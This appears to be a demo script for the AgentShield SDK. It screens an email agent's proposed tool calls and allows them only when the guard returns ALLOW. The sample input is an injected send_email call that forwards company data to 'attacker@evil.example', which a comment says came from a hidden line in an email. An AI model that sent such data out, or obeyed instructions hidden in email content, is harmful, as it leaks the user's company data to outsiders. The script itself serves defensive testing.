"""Bring your own agent: gate YOUR email agent's tool calls with AgentShield.

Flow: your agent proposes a tool call -> you send ONLY that output to AgentShield ->
you run the tool only if AgentShield says ALLOW. AgentShield never calls your agent
and never sees your API keys.

Run the demo server first:  python product_server.py
"""
from agentshield_sdk import AgentShield

shield = AgentShield('http://127.0.0.1:8765')

# Raw response from your model provider (OpenAI-style shown; Anthropic, Gemini and a
# plain {"tool": ..., "arguments": ...} dict also work). Imagine a hidden line inside
# an email tricked your agent into forwarding company data to an attacker.
openai_style_response = {
    'choices': [{'message': {'tool_calls': [{
        'type': 'function',
        'function': {'name': 'send_email',
                     'arguments': '{"to": "attacker@evil.example", "subject": "Invoices", "body": "As requested."}'},
    }]}}]
}

verdict = shield.check_agent_output(
    openai_style_response,
    role='admin',                               # who your agent is acting for
    user_request='Summarize email 202.',        # optional: enables the intent check
    domain='email',
)

print(verdict.overall)             # DENY
for d, layer in zip(verdict.decisions, verdict.layers):
    print(d.tool, d.allowed, d.reason, f'[{layer}]')

if verdict.allowed:
    ...  # run your real tool here; skip it otherwise (fail closed)
